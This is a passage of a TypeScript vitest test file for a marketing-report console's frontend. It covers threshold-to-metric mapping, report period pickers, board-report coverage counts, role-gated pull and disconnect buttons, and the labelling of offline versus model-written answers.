import { readFileSync } from "node:fs";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, describe, expect, it, vi } from "vitest";
import { LINE_META, METRICS_WITHOUT_A_LINE, caughtBy, unattributed } from "./lineMap";
import { REPORT_SANDBOX, ReportFrame, openReportTab, type TabOpener } from "./reportFrame";
import type {
  MrAskAnswer, MrAskFact, MrBoardCoverageColumn, MrBoardRow, MrReportKind, MrReportPeriods,
} from "@/lib/api";
// Values from the API client come in by relative path: the suite runs without
// the `@/` alias, which only the erased type imports above can use.
import {
  ApiError, MR_TEMPLATES_OFF, MR_VENDOR_OFF, apiBody, apiCode, isCampaignKind, isVendorKind,
  mrActivateTemplate, mrBoardReportHtml, mrBuildVendorReport, mrReadTemplateSample,
  mrReportTemplates, mrSaveTemplate, mrTemplateLayout, mrTemplateStarterFileUrl, mrVendorReportHtml,
  mrVendorReportPeriods, readTemplateListing, readTemplateReading, readVendorPeriods,
  type MrTemplateLine, type MrTemplatePlaceholder, type MrTemplatePreview, type MrTemplateVersion,
} from "../../../../lib/api";
import {
  arrange, handPlan, historyRows, layoutOf, madeBy, madeFrom, matchedLine, moveRow, moveRowTo,
  noPreviewLine, previewHoldsSave, previewOf, problemParts, problemsHeading, rateLimitedLine,
  readFailure, readingsLeftLine, removedLine, renameRow, sameLayout, sectionTitles, sectionTypes,
  setByLine, showRow, switchedLine, templateBandLine, versionLabel,
} from "./templateModel";
import {
  REPORT_META, REPORT_PERIOD_LIST, absentMetrics, boardPeriodOptions, boardPeriodValues,
  filledOf, missingFigures, periodsFor, takesPeriod, vendorBuiltLine, vendorMonthPick,
  visibleRuns,
} from "../../../console/mr/reportMeta";
import {
  askCaveat, askPeriodLabel, askProvenance, citedFacts, citeTitle, citeTokens, isOfflineSummary,
  mayDisconnect, mrDataActions, notModelWritten, offersForcedPull, pullBody, readNarrative,
  summarisePull,
} from "../../../console/mr/format";

/** The threshold keys `GET /api/mr/targets` returned on the live account.
 *  Pinned here so a key the backend adds — or renames — turns this red instead
 *  of silently reading as a line that catches nothing. */
const LIVE_THRESHOLD_KEYS = [
  "bad_lead_rate_red",
  "booking_rate_broken",
  "cac_red",
  "cac_target",
  "canceled_rate_red",
  "conversion_drop_pct",
  "cost_per_booking_flag",
  "cost_per_qualified_lead_red",
  "cost_per_qualified_lead_target_high",
  "cost_per_qualified_lead_target_low",
  "mgmt_fee_limit",
  "no_show_rate_red",
  "ql_ratio_great",
  "spend_no_demo_limit",
  "zero_completed_min_demos",
];

/** The flag metrics `GET /api/mr/overview` returned on the same account. */
const LIVE_FLAG_METRICS = [
  "cost_per_qualified_lead",
  "cac",
  "cost_per_booking",
  "channel_goal",
  "bad_lead_rate",
  "no_show_rate",
  "canceled_rate",
  "zero_completed",
];

describe("the line each flag crossed", () => {
  it("has an entry for every threshold the API returns", () => {
    const missing = LIVE_THRESHOLD_KEYS.filter((k) => !(k in LINE_META));
    expect(missing, "a threshold with no entry renders as a line nobody can read").toEqual([]);
  });

  it("accounts for every flag metric the API raises", () => {
    const owned = new Set(Object.values(LINE_META).map((m) => m.metric).filter(Boolean));
    const orphans = LIVE_FLAG_METRICS.filter((m) => !owned.has(m) && !(m in METRICS_WITHOUT_A_LINE));
    expect(orphans, "a flag metric no line owns is one the Lines panel silently loses").toEqual([]);
  });

  it("never lets two lines claim the same flag metric", () => {
    // Two owners would double-count the same finding on this panel.
    const seen = new Map<string, string>();
    for (const [key, meta] of Object.entries(LINE_META)) {
      if (!meta.metric) continue;
      expect(seen.has(meta.metric), `${meta.metric} claimed twice`).toBe(false);
      seen.set(meta.metric, key);
    }
  });

  it("does not join by prefix, which is the bug this file exists for", () => {
    // All three start with `cost_per_qualified_lead`. Only one is the red line.
    expect(LINE_META.cost_per_qualified_lead_red.metric).toBe("cost_per_qualified_lead");
    expect(LINE_META.cost_per_qualified_lead_target_low.metric).toBeNull();
    expect(LINE_META.cost_per_qualified_lead_target_high.metric).toBeNull();
  });
});

describe("caughtBy", () => {
  const groups = [
    { metric: "cost_per_qualified_lead", count: 4 },
    { metric: "no_show_rate", count: 7 },
    { metric: "channel_goal", count: 9 },
    { metric: null, count: 2 },
  ];

  it("counts the findings a line is responsible for", () => {
    expect(caughtBy("cost_per_qualified_lead_red", groups)).toBe(4);
    expect(caughtBy("no_show_rate_red", groups)).toBe(7);
  });

  it("reads zero for a line that fires but is currently catching nothing", () => {
    expect(caughtBy("canceled_rate_red", groups)).toBe(0);
  });

  it("reads null for a line that does not raise flags at all", () => {
    // "does not fire" and "fires but caught nothing" are different statements
    // about the same dash, and the panel says which.
    expect(caughtBy("cac_target", groups)).toBeNull();
    expect(caughtBy("ql_ratio_great", groups)).toBeNull();
  });

  it("reads null for a key it has never heard of rather than guessing zero", () => {
    expect(caughtBy("something_the_backend_added_today", groups)).toBeNull();
  });

  it("adds up when one metric arrives split across levels", () => {
    expect(caughtBy("no_show_rate_red", [
      { metric: "no_show_rate", count: 5 },
      { metric: "no_show_rate", count: 2 },
    ])).toBe(7);
  });
});

describe("unattributed", () => {
  it("names the flags no line owns, so the panel can show them rather than lose them", () => {
    const out = unattributed([
      { metric: "cost_per_qualified_lead", count: 4 },
      { metric: "channel_goal", count: 9 },
    ]);
    expect(out.map((g) => g.metric)).toEqual(["channel_goal"]);
  });

  it("ignores a group with no metric at all", () => {
    expect(unattributed([{ metric: null, count: 3 }])).toEqual([]);
  });
});

/* --------------------------------------------------------------------------
   The Reports panel's period picker.
   Lives here rather than in a file of its own: this is the MR work area's test
   module, and the decision under test — which of the endpoint's two lists a
   report kind reads — belongs to the panel next door.
   -------------------------------------------------------------------------- */


/** The exact shape `GET /api/mr/report-periods` answers with — two named
 *  lists, never a map keyed by report kind. Pinned from
 *  `reports.available_periods()`, so a backend that renames or drops a list
 *  turns this red instead of quietly handing the picker nothing. */
const LIVE_PERIODS: MrReportPeriods = {
  months: [
    { period: "2026-09", label: "September 2026", current: true },
    { period: "2026-08", label: "August 2026", current: false },
    { period: "2026-07", label: "July 2026", current: false },
  ],
  quarters: [
    { period: "2026-Q3", label: "Q3 2026", current: true },
    { period: "2026-Q2", label: "Q2 2026", current: false },
  ],
};

/** The eight kinds `POST /api/mr/reports/{kind}` answers 422 for when a period
 *  is sent — so the picker must never offer them one. */
const KINDS_WITHOUT_A_PERIOD: MrReportKind[] = [
  "daily_summary", "weekly_summary", "threshold_alert", "competitor_digest",
  "opportunity_report", "utm_attribution", "icp_signal", "daily_movement",
];

describe("periodsFor", () => {
  it("reads the monthly report's periods from the months list", () => {
    expect(periodsFor("monthly_summary", LIVE_PERIODS).map((p) => p.period))
      .toEqual(["2026-09", "2026-08", "2026-07"]);
  });

  it("reads the quarterly report's periods from the quarters list, so a specific quarter can be asked for", () => {
    expect(periodsFor("quarterly_summary", LIVE_PERIODS).map((p) => p.period))
      .toEqual(["2026-Q3", "2026-Q2"]);
  });

  it("never keys the payload by report kind — the regression that emptied the picker", () => {
    // `periods["monthly_summary"]` is undefined for all ten kinds; only the two
    // list names exist on the payload, and that is what the map must hold.
    expect(Object.values(REPORT_PERIOD_LIST).every((list) => list in LIVE_PERIODS)).toBe(true);
    expect(Object.keys(LIVE_PERIODS)).not.toContain("monthly_summary");
  });

  it("offers nothing for a kind the backend refuses a period on", () => {
    for (const kind of KINDS_WITHOUT_A_PERIOD) {
      expect(takesPeriod(kind)).toBe(false);
      expect(periodsFor(kind, LIVE_PERIODS)).toEqual([]);
    }
    expect(takesPeriod("monthly_summary")).toBe(true);
    expect(takesPeriod("quarterly_summary")).toBe(true);
  });

  it("returns a list, never undefined, while the periods are unread or the read failed", () => {
    expect(periodsFor("monthly_summary", null)).toEqual([]);
    expect(periodsFor("quarterly_summary", null)).toEqual([]);
  });

  it("returns a list when the payload holds no periods at all, so the picker shows its empty state", () => {
    expect(periodsFor("monthly_summary", { months: [], quarters: [] })).toEqual([]);
  });

  it("survives a payload missing a list rather than handing the picker undefined to map over", () => {
    const partial = { months: LIVE_PERIODS.months } as MrReportPeriods;
    expect(periodsFor("quarterly_summary", partial)).toEqual([]);
    expect(periodsFor("monthly_summary", partial)).toHaveLength(3);
  });
});

/* --------------------------------------------------------------------------
   The board report: its two period pickers, and what it could fill.
   Same reason the period tests above live here — this is the MR work area's
   test module, and both decisions belong to the Reports panel next door.
   `Reports.tsx` imports `@/lib/api` at runtime and vitest resolves no `@/`
   alias, so the seam that can be tested is `reportMeta.ts` (and `format.ts`),
   which import types only.
   -------------------------------------------------------------------------- */

describe("boardPeriodOptions", () => {
  it("offers months, quarters and the years they fall in — one control for all three comparisons", () => {
    const groups = boardPeriodOptions(LIVE_PERIODS);
    expect(groups.map((g) => g.label)).toEqual(["Months", "Quarters", "Years"]);
    // The locked decision: the ledger's columns are only A and B, so
    // month-vs-month, quarter-vs-quarter and year-vs-year all have to be
    // expressible from the same list.
    expect(boardPeriodValues(groups)).toEqual([
      "2026-09", "2026-08", "2026-07", "2026-Q3", "2026-Q2", "2026",
    ]);
  });

  it("offers only period strings the board route parses — YYYY-MM, YYYY-Qn or YYYY", () => {
    // `board_period()` refuses anything else with a 422 naming what it expected.
    for (const value of boardPeriodValues(boardPeriodOptions(LIVE_PERIODS))) {
      expect(value, `${value} is not a board-report period`)
        .toMatch(/^\d{4}(-(0[1-9]|1[0-2])|-Q[1-4])?$/);
    }
  });

  it("derives a year from the months on file and never invents one", () => {
    const groups = boardPeriodOptions({
      months: [
        { period: "2026-01", label: "January 2026", current: false },
        { period: "2025-12", label: "December 2025", current: false },
        { period: "2025-03", label: "March 2025", current: false },
      ],
      quarters: [],
    });
    const years = groups.find((g) => g.label === "Years");
    expect(years?.options.map((o) => o.period)).toEqual(["2026", "2025"]);
  });

  it("marks the year holding the current month, so 'so far' reads on it too", () => {
    const years = boardPeriodOptions(LIVE_PERIODS).find((g) => g.label === "Years");
    expect(years?.options[0]).toEqual({ period: "2026", label: "2026", current: true });
  });

  it("drops a group with nothing in it rather than printing an empty heading", () => {
    const groups = boardPeriodOptions({ months: LIVE_PERIODS.months, quarters: [] });
    expect(groups.map((g) => g.label)).toEqual(["Months", "Years"]);
  });

  it("offers nothing at all while the periods are unread, or the read failed, or the tracker holds none", () => {
    // All three are the caller's own sentence to write — an empty select would
    // say "there is nothing" for a read that never came back.
    expect(boardPeriodOptions(null)).toEqual([]);
    expect(boardPeriodOptions({ months: [], quarters: [] })).toEqual([]);
    expect(boardPeriodValues([])).toEqual([]);
  });

  it("survives a payload missing a list rather than handing the picker undefined to map over", () => {
    const partial = { quarters: LIVE_PERIODS.quarters } as MrReportPeriods;
    expect(boardPeriodOptions(partial).map((g) => g.label)).toEqual(["Quarters"]);
  });
});

/* The production case this whole block exists for: the capture on file predates
   the roll-up parser expanding from 8 fields to 42, so the report fills 13 of
   38. A thin capture must never read as a thin quarter. */
const CATALOG_SIZE = 38;
const FILLED_TODAY = 13;

const ledgerRows: MrBoardRow[] = Array.from({ length: CATALOG_SIZE }, (_, i) => ({
  key: `m${i}`,
  label: `Metric ${i}`,
  group: i < 9 ? "Budget & Efficiency" : "Revenue",
  format: "money",
  polarity: "up",
}));

const liveColumn: MrBoardCoverageColumn = {
  column: "Q1 2026",
  period: "2026-Q1",
  months: ["2026-01", "2026-02", "2026-03"],
  filled: ledgerRows.slice(0, FILLED_TODAY).map((r) => r.key),
  absent: ledgerRows.slice(FILLED_TODAY).map((r) => r.key),
  absent_reasons: Object.fromEntries(
    ledgerRows.slice(FILLED_TODAY)
      .map((r) => [r.key, `the roll-up tab does not report '${r.key}' for this period`]),
  ),
  filled_count: FILLED_TODAY,
  metric_count: CATALOG_SIZE,
};

describe("filledOf", () => {
  it("reads the production case as 13 of 38", () => {
    expect(filledOf(liveColumn)).toEqual({ filled: 13, of: 38 });
  });

  it("counts the catalog itself when the backend sent no total, never 'of 0'", () => {
    const older = { ...liveColumn, metric_count: 0 } as MrBoardCoverageColumn;
    expect(filledOf(older)).toEqual({ filled: 13, of: 38 });
  });

  it("reads a fully covered column as all of them, not as a special case", () => {
    const full: MrBoardCoverageColumn = {
      ...liveColumn,
      filled: ledgerRows.map((r) => r.key),
      absent: [],
      absent_reasons: {},
      filled_count: CATALOG_SIZE,
    };
    expect(filledOf(full)).toEqual({ filled: 38, of: 38 });
    expect(absentMetrics(full, ledgerRows)).toEqual([]);
  });
});

describe("absentMetrics", () => {
  it("names every metric the column has no figure for — 25 of them, not one dropped", () => {
    const missing = absentMetrics(liveColumn, ledgerRows);
    expect(missing).toHaveLength(CATALOG_SIZE - FILLED_TODAY);
    // The count under the sentence and the list beneath it are the same fact,
    // and a reader who opens the list must be able to count it back.
    expect(missing.length + filledOf(liveColumn).filled).toBe(filledOf(liveColumn).of);
  });

  it("carries the backend's own reason for each one, so absent is never read as zero", () => {
    const missing = absentMetrics(liveColumn, ledgerRows);
    expect(missing[0].label).toBe("Metric 13");
    expect(missing[0].reason).toBe("the roll-up tab does not report 'm13' for this period");
    expect(missing.every((m) => m.reason.length > 0)).toBe(true);
  });

  it("prints them in the report's own row order, not the order the keys arrived in", () => {
    const shuffled: MrBoardCoverageColumn = {
      ...liveColumn,
      absent: [...liveColumn.absent].reverse(),
    };
    expect(absentMetrics(shuffled, ledgerRows).map((m) => m.key))
      .toEqual(ledgerRows.slice(FILLED_TODAY).map((r) => r.key));
  });

  it("still lists a metric the ledger rows do not carry, rather than shrinking the count", () => {
    const withStranger: MrBoardCoverageColumn = {
      ...liveColumn,
      absent: [...liveColumn.absent, "a_row_this_frontend_has_never_seen"],
      metric_count: CATALOG_SIZE + 1,
    };
    const missing = absentMetrics(withStranger, ledgerRows);
    expect(missing).toHaveLength(CATALOG_SIZE - FILLED_TODAY + 1);
    expect(missing[missing.length - 1].label).toBe("a_row_this_frontend_has_never_seen");
  });

  it("says so plainly when no reason came back, instead of printing an empty dash", () => {
    const silent: MrBoardCoverageColumn = { ...liveColumn, absent_reasons: {} };
    expect(absentMetrics(silent, ledgerRows).every((m) => m.reason === "the report did not say why"))
      .toBe(true);
  });

  it("survives a report carrying no rows at all — every absent key still gets named", () => {
    expect(absentMetrics(liveColumn, [])).toHaveLength(CATALOG_SIZE - FILLED_TODAY);
  });
});

describe("REPORT_META", () => {
  it("has an entry for the board kinds, which list on the same run rail as the ten", () => {
    // `GET /api/mr/runs` returns these alongside the campaign kinds; a kind with
    // no entry renders in the history table as its own raw id.
    expect(REPORT_META.board_report.label).toBe("Board Report");
    expect(REPORT_META.board_report_comparison.label).toBe("Board Report — two periods");
  });

  it("still refuses the board kinds a period picker — they take two, from their own control", () => {
    // `POST /api/mr/reports/{kind}` answers 422 for a board kind and names the
    // route that does build it, so the ten-kind list must never offer one.
    expect(REPORT_PERIOD_LIST).not.toHaveProperty("board_report");
    expect(REPORT_PERIOD_LIST).not.toHaveProperty("board_report_comparison");
  });
});

/* --------------------------------------------------------------------------
   Who is offered the Disconnect button on a connected sheet.
   -------------------------------------------------------------------------- */

describe("mayDisconnect", () => {
  it("offers the button when the server says this caller may remove the sheet", () => {
    expect(mayDisconnect({ can_remove: true }, { whenUnknown: false })).toBe(true);
  });

  it("hides it when the server says no — the click would only earn a 403", () => {
    expect(mayDisconnect({ can_remove: false }, { whenUnknown: true })).toBe(false);
  });

  it("never offers it on the primary tracker, whatever else is said", () => {
    expect(mayDisconnect({ primary: true, can_remove: true }, { whenUnknown: true })).toBe(false);
  });

  it("falls back to the panel's own answer while the backend has not started sending the field", () => {
    // The deploy-skew window is real here: Vercel ships in about a minute and
    // Cloud Run in four to six, and a reply with no `can_remove` came from a
    // backend with no delete gate at all — where that button worked. Absent
    // must mean "no opinion", so nothing that worked disappears and nothing
    // new can 403.
    expect(mayDisconnect({}, { whenUnknown: true })).toBe(true);
    expect(mayDisconnect({}, { whenUnknown: false })).toBe(false);
  });

  it("lets the server's answer win over the fallback in both directions", () => {
    expect(mayDisconnect({ can_remove: true }, { whenUnknown: false })).toBe(true);
    expect(mayDisconnect({ can_remove: false }, { whenUnknown: true })).toBe(false);
  });
});

/* --------------------------------------------------------------------------
   Who is offered the pull, and who is offered the rest of the Data panel.
   -------------------------------------------------------------------------- */

/** Source of a sibling file, for the screens that cannot be rendered here — this
 *  suite has no DOM, and tsconfig's `jsx: "preserve"` means a .tsx module cannot
 *  be imported. The same device `geo/edits.test.ts` uses for its editor gate. */
const sourceOf = (file: string) => readFileSync(new URL(file, import.meta.url), "utf8");

describe("mrDataActions", () => {
  const member = { is_admin: false, is_creator: false };

  it("offers a plain member the pull — the server asks only that they are signed in", () => {
    expect(mrDataActions(member).pull).toBe(true);
    expect(mrDataActions({ is_admin: false }).pull).toBe(true);
  });

  it("offers a plain member nothing that edits what the whole workspace reads", () => {
    expect(mrDataActions(member).edit).toBe(false);
  });

  it("reads a session stored before the role flags existed as a member, not as nobody", () => {
    expect(mrDataActions({})).toEqual({ pull: true, edit: false });
  });

  it("keeps connecting and re-reading with admins and creators", () => {
    expect(mrDataActions({ is_admin: true })).toEqual({ pull: true, edit: true });
    expect(mrDataActions({ is_creator: true })).toEqual({ pull: true, edit: true });
  });

  it("offers a GEO-only account neither — the scope wall refuses every /api/mr route", () => {
    expect(mrDataActions({ is_geo_only: true, is_admin: true })).toEqual({ pull: false, edit: false });
  });

  it("offers nothing when nobody is signed in", () => {
    expect(mrDataActions(null)).toEqual({ pull: false, edit: false });
    expect(mrDataActions(undefined)).toEqual({ pull: false, edit: false });
  });

  it("does not hand a member Disconnect on a sheet somebody else connected, whichever backend answers", () => {
    const { edit } = mrDataActions(member);
    // A backend that has not started answering `can_remove`: the panel's own answer.
    expect(mayDisconnect({}, { whenUnknown: edit })).toBe(false);
    // One that has: the server's answer wins outright, in both directions.
    expect(mayDisconnect({ can_remove: false }, { whenUnknown: edit })).toBe(false);
    expect(mayDisconnect({ can_remove: true }, { whenUnknown: edit })).toBe(true);
  });
});

/** What the screens draw, read off their source.
 *
 *  The defect being pinned was invisible to every other kind of test: the old
 *  gate typed fine, rendered fine, and simply drew no button for the team.
 *  `mrDataActions` above proves the rule; this proves the screens ask it. */
describe("the MR screens offer the pull to everyone, and only the pull", () => {
  const data = () => sourceOf("./Data.tsx");

  it("Data.tsx asks the shared gate and reads no role flag of its own", () => {
    expect(data()).toContain("mrDataActions(user)");
    expect(data().match(/user\??\.\s*is_(creator|admin|geo_only)/g) || []).toEqual([]);
  });

  it("draws the pull button on the pull right, not the edit right", () => {
    expect(data()).toMatch(/mayPull\s*\?\s*<PullButton/);
    expect(data()).not.toMatch(/mayEdit\s*\?\s*\(?\s*<PullButton/);
  });

  it("keeps connect, disconnect and re-reading behind the edit right", () => {
    // The connect form and the line that tells you to share the sheet first.
    expect(data().match(/mayEdit && sources\.data\?\.enabled/g)).toHaveLength(2);
    expect(data()).toContain("mayDisconnect(s, { whenUnknown: mayEdit })");
    expect(data()).toMatch(/mayEdit\s*\?\s*\(\s*<button[\s\S]*?onClick=\{scan\}/);
  });

  it("has no dataset delete control, so nothing here needs `can_delete` yet", () => {
    // `MrDataset.can_delete === false` means the DELETE would answer 403. The day
    // this panel grows a delete control it must be hidden on that — and this is
    // the reminder to do it.
    expect(
      data(),
      "a dataset delete now exists in Data.tsx: hide it when can_delete === false, then update this test",
    ).not.toContain("mrDeleteDataset");
  });

  it("the whole-workspace empty state carries the pull, not a pointer to a panel it stands in front of", () => {
    const ws = sourceOf("../MrWorkspace.tsx");
    expect(ws).toMatch(/if \(!ov\.has_data\) return <NothingPulled/);
    expect(ws).toMatch(/function NothingPulled[\s\S]*useWorkbookPull[\s\S]*<PullWorkbook/);
    expect(ws).not.toContain("Connect the tracker on the Data panel");
    expect(ws).toContain("team's workbook data");
  });

  it("the board builder's empty state carries the pull too", () => {
    const reports = sourceOf("./Reports.tsx");
    expect(reports).toMatch(/No period holds tracker figures yet"[\s\S]{0,80}action=\{<PullWorkbook/);
    expect(reports).toContain("team's workbook data");
  });
});

/* --------------------------------------------------------------------------
   What a finished pull says.
   -------------------------------------------------------------------------- */

describe("summarisePull", () => {
  const STAMP = "2026-09-21T09:58:00Z";
  const since = (iso: string) => (iso === STAMP ? "2 minutes ago" : "");

  it("says a clean pull landed, with the rows and the tabs", () => {
    const out = summarisePull(
      { status: "ok", degraded: [], tabs: [{ tab: "A", metrics: 10 }, { tab: "B", metrics: 5 }] },
      since, true,
    );
    expect(out).toMatchObject({ kind: "ok", tone: "ok", rows: 15, tabs: 2 });
    expect(out.message).toBe("Pulled 15 rows across 2 tabs. The team's workbook data is now up to date.");
  });

  it("reads singular counts as singular, and groups thousands the same on every machine", () => {
    expect(summarisePull({ tabs: [{ tab: "A", metrics: 1 }] }, since, true).message)
      .toContain("Pulled 1 row across 1 tab.");
    expect(summarisePull({ tabs: [{ tab: "A", metrics: 1234 }] }, since, true).message)
      .toContain("Pulled 1,234 rows");
  });

  it("reads a reply with no status field as a normal pull — an older backend sent none", () => {
    expect(summarisePull({ tabs: [{ tab: "A", metrics: 3 }] }, since, true).kind).toBe("ok");
  });

  it("does not report a partial pull as a success, and names what did not land", () => {
    const out = summarisePull(
      { status: "partial", degraded: ["Leads — the tab was unreadable"], tabs: [{ tab: "A", metrics: 4 }] },
      since, true,
    );
    expect(out.kind).toBe("partial");
    expect(out.tone).toBe("warn");
    expect(out.message).toContain("but not everything: Leads — the tab was unreadable");
    expect(out.message).toContain("still showing its previous data");
  });

  it("falls back to the failed tabs when the server gave no reasons of its own", () => {
    const out = summarisePull(
      { tabs: [{ tab: "A", metrics: 4 }, { tab: "B", error: "quota exceeded" }] },
      since, true,
    );
    expect(out.kind).toBe("partial");
    expect(out.message).toContain("B — quota exceeded");
  });

  it("prefers the server's reasons over its own list of failed tabs", () => {
    const out = summarisePull(
      { status: "partial", degraded: ["the server's words"], tabs: [{ tab: "B", error: "raw error" }] },
      since, true,
    );
    expect(out.message).toContain("the server's words");
    expect(out.message).not.toContain("raw error");
  });

  it("does not say 'done' about a pull that found no rows — the reader would be shown the same blank screen", () => {
    const out = summarisePull({ status: "ok", degraded: [], tabs: [] }, since, true);
    expect(out.kind).toBe("empty");
    expect(out.tone).toBe("warn");
    expect(out.message).toContain("no rows");
  });

  it("treats 'already fresh' as a calm success, and says how long ago", () => {
    // It arrives as `tabs: []` with nothing ingested — the exact shape of a pull
    // that found no rows — so it is the order of the checks that keeps it from
    // being reported as an empty workbook.
    const out = summarisePull(
      { status: "fresh", degraded: [], tabs: [], last_pulled_at: STAMP },
      since, true,
    );
    expect(out.kind).toBe("fresh");
    expect(out.tone).toBe("ok");
    expect(out.message).toBe("Already up to date — the team's workbook data was pulled 2 minutes ago.");
  });

  it("still says something true when the 'fresh' reply carries no readable time", () => {
    expect(summarisePull({ status: "fresh", tabs: [] }, since, true).message)
      .toBe("Already up to date — the team's workbook data was pulled a moment ago.");
    expect(summarisePull({ status: "fresh", tabs: [], last_pulled_at: "not a date" }, since, true).message)
      .toContain("pulled a moment ago");
  });

  it("offers the way past 'fresh' only for 'fresh'", () => {
    // The component draws "Pull again anyway" on kind === "fresh" and nowhere else.
    const others = [
      summarisePull({ status: "ok", tabs: [{ tab: "A", metrics: 2 }] }, since, true),
      summarisePull({ status: "partial", tabs: [{ tab: "A", metrics: 2 }] }, since, true),
      summarisePull({ tabs: [] }, since, true),
    ];
    expect(others.map((o) => o.kind)).not.toContain("fresh");
  });
});

describe("'Pull again anyway' is for admins and creators", () => {
  const STAMP = "2026-09-21T09:58:00Z";
  const since = (iso: string) => (iso === STAMP ? "2 minutes ago" : "");
  const fresh = { status: "fresh", degraded: [], tabs: [], last_pulled_at: STAMP };

  it("tells a member, calmly, when they can pull again — and does not offer to force it", () => {
    const out = summarisePull(fresh, since, false);
    expect(out.kind).toBe("fresh");
    expect(out.message).toBe(
      "Already up to date — the team's workbook data was pulled 2 minutes ago. "
      + "You can pull again in a couple of minutes.",
    );
  });

  it("does not tell an admin or creator to wait — the button is beside the line instead", () => {
    expect(summarisePull(fresh, since, true).message).not.toContain("pull again in a couple of minutes");
  });

  it("says the wait only about 'fresh', never about a pull that landed, part-landed or found nothing", () => {
    const rest = [
      summarisePull({ status: "ok", tabs: [{ tab: "A", metrics: 2 }] }, since, false),
      summarisePull({ status: "partial", tabs: [{ tab: "A", metrics: 2 }] }, since, false),
      summarisePull({ tabs: [] }, since, false),
    ];
    for (const out of rest) expect(out.message).not.toContain("pull again in a couple of minutes");
  });

  it("draws the button only after 'fresh' and only for a reader who may edit", () => {
    expect(offersForcedPull("fresh", true)).toBe(true);
    expect(offersForcedPull("fresh", false)).toBe(false);
    for (const kind of ["ok", "partial", "empty"] as const) {
      expect(offersForcedPull(kind, true)).toBe(false);
      expect(offersForcedPull(kind, false)).toBe(false);
    }
  });

  it("sends no `force` on a normal pull, and none at all from a member who asks for it", () => {
    expect(pullBody(false, true)).toEqual({});
    expect(pullBody(false, false)).toEqual({});
    expect(pullBody(true, false)).toEqual({});
    expect(pullBody(true, true)).toEqual({ force: true });
  });

  it("is drawn and sent through those two helpers, and through the shared gate", () => {
    const src = sourceOf("./Data.tsx");
    expect(src).toMatch(/offersForcedPull\(s\.outcome\.kind, pull\.mayForce\)\s*&&/);
    expect(src).toContain("mrIngestSheet(pullBody(opts?.force === true, mayForce))");
    expect(src).toMatch(/const \{ edit: mayForce \} = mrDataActions\(user\)/);
    // The one place `force: true` is written at a call site is the gated button.
    expect(src.match(/force: true/g)).toHaveLength(1);
  });
});

/* The hub's Data panel offers no CSV/PDF upload, no single-tab (`gid`) pull and
   no dataset delete — the server is restricting those to admins and creators,
   and there is nothing here to gate. This is the reminder for the day one is
   added: it must be drawn on `mayEdit`, and a 403 must show the server's own
   message (`describeFailure` already does, for a pull). */
describe("the hub offers no other restricted action yet", () => {
  const panel = () => sourceOf("./Data.tsx");

  it("has no upload or single-tab pull (the dataset delete is pinned above)", () => {
    expect(panel(), "an upload now exists in Data.tsx: gate it on mayEdit").not.toMatch(/mrIngest\b|mrIngestPdf|type="file"/);
    expect(panel(), "a single-tab pull now exists in Data.tsx: gate it on mayEdit").not.toMatch(/\bgid\s*:/);
  });
});

/* --------------------------------------------------------------------------
   How an Ask answer was made.
   -------------------------------------------------------------------------- */

const factOf = (id: string, extra: Partial<MrAskFact> = {}): MrAskFact => ({
  id, label: `Figure ${id}`, value: 1, unit: null,
  tab: "Vendor Summary", month: "2026-07", basis: "month to date", ...extra,
});

/** A reply from a backend that predates every new field. */
const OLD: MrAskAnswer = {
  question: "Which vendor is cheapest?",
  timeframe: "monthly",
  answer: "Vendor A spent $100 [f12].\n\nRecommend: hold.",
  used_tabs: ["Vendor Summary"],
};

describe("readNarrative and the offline marker", () => {
  it("no longer strips the (offline summary) marker — it was the only tell that the text was canned", () => {
    const out = readNarrative("[daily_summary] (offline summary) Spend was $100.\nRecommend: hold.");
    expect(out.summary).toBe("[daily_summary] (offline summary) Spend was $100.");
    expect(out.recommend).toBe("hold.");
  });

  it("still strips the heading line and the bold, and still splits off the Recommend line", () => {
    const out = readNarrative("# Title\n\n**Vendor A** spent $100.\n\nRecommend: hold.");
    expect(out).toEqual({ summary: "Vendor A spent $100.", recommend: "hold." });
  });

  it("leaves citation markers where the model put them", () => {
    expect(readNarrative("Spend was $100 [f12]. Recommend: hold [f3].")).toEqual({
      summary: "Spend was $100 [f12].", recommend: "hold [f3].",
    });
  });
});

describe("isOfflineSummary", () => {
  it("recognises the marker at the head of the text, through a heading and bold", () => {
    expect(isOfflineSummary("[daily_summary] (offline summary) Spend was $100.")).toBe(true);
    expect(isOfflineSummary("# Title\n\n**[daily_summary] (Offline Summary)** Spend.")).toBe(true);
  });

  it("does not mistake an ordinary answer, or a marker mid-text, for one", () => {
    expect(isOfflineSummary("Vendor A spent $100.")).toBe(false);
    expect(isOfflineSummary("Vendor A spent $100 [daily_summary] (offline summary)")).toBe(false);
    expect(isOfflineSummary("")).toBe(false);
  });
});

describe("askProvenance", () => {
  it("reads an answer with no `ai` field as model-written — an older backend sent the text and nothing else", () => {
    expect(askProvenance(OLD)).toEqual({ ai: true, reason: null });
    expect(askProvenance({ ...OLD, ai: true })).toEqual({ ai: true, reason: null });
  });

  it("says `ai: false` is not model-written, and carries the reason the backend gave", () => {
    expect(askProvenance({ ...OLD, ai: false, fallback_reason: "  the model returned no answer " }))
      .toEqual({ ai: false, reason: "the model returned no answer" });
  });

  it("says `ai: false` even when the backend gave no reason, and invents none", () => {
    expect(askProvenance({ ...OLD, ai: false })).toEqual({ ai: false, reason: null });
    expect(askProvenance({ ...OLD, ai: false, fallback_reason: null })).toEqual({ ai: false, reason: null });
    expect(askProvenance({ ...OLD, ai: false, fallback_reason: "   " })).toEqual({ ai: false, reason: null });
  });

  it("catches a canned text by its own marker when the backend sent no `ai` field", () => {
    expect(askProvenance({ ...OLD, answer: "[daily_summary] (offline summary) Spend was $100." }))
      .toEqual({ ai: false, reason: null });
  });

  it("lets the marker outvote an `ai: true` that contradicts it", () => {
    expect(askProvenance({ ...OLD, ai: true, answer: "[daily_summary] (offline summary) Spend." }).ai).toBe(false);
  });
});

describe("notModelWritten", () => {
  it("writes the reason as a sentence, then says what the text is", () => {
    expect(notModelWritten("the model returned no answer")).toBe(
      "The model returned no answer. What follows is the figures read straight from the tabs, not an analysis of them.",
    );
  });

  it("does not double a full stop the reason already ends with", () => {
    expect(notModelWritten("No key is set.")).toMatch(/^No key is set\. What follows/);
  });

  it("still says what the text is when there is no reason", () => {
    expect(notModelWritten(null)).toBe(
      "What follows is the figures read straight from the tabs, not an analysis of them.",
    );
  });
});

describe("askPeriodLabel", () => {
  it("shows the period the backend resolved", () => {
    expect(askPeriodLabel({ period_label: "July 2026" })).toBe("July 2026");
  });

  it("shows nothing when there is no label — and never the granularity word in `timeframe`", () => {
